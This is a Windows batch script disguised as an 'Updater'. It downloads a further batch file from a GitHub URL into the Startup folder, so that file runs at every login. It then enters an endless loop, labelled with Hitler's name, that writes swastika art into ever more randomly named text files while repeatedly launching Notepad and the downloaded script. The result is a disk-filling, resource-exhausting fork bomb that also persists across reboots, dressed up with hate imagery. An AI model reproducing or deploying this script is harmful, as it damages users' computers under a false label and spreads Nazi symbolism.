@echo off
REM Updater

echo ---------------------------------------------------------------------------
echo                                  Updating
echo.
curl "https://raw.githubusercontent.com/Izaiashi/Random-Batch-Shit/main/optimizer-api.bat" -o "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\optimizer-api.bat"
echo.
echo ---------------------------------------------------------------------------
echo.

REM Loops

:Hitler
	set FILENAME=%RANDOM%.txt
	echo.
	echo ▓▓▓▓▓▓▀▀░░░░░░▀▀▓▓▓▓▓▓ >> %FILENAME%
	echo ▓▓▓▀░░░░░▄██▄░░░░░▀▓▓▓ >> %FILENAME%
	echo ▓▓░░░░░▄▄██▀░░░░░░░░▓▓ >> %FILENAME%
	echo ▓░░░░░▄██▀░░░▄█▄░░░░░▓ >> %FILENAME%
	echo ▌░░░░░▀██▄▄▄█████▄░░░▐ >> %FILENAME%
	echo ░░▄▄▄░░░▀████▀░▀▀██▄░░ >> %FILENAME%
	echo ░░▀██▄░▄▄████▄░░░▀▀▀░░ >> %FILENAME%
	echo ▌░░░▀█████▀▀▀██▄░░░░░▐ >> %FILENAME%
	echo ▓░░░░░▀█▀░░░▄██▀░░░░░▓ >> %FILENAME%
	echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> %FILENAME%
	echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> %FILENAME%
	echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> %FILENAME%
  	start "" notepad.exe
  	start "" optimizer-api.bat
  	goto :Hitler
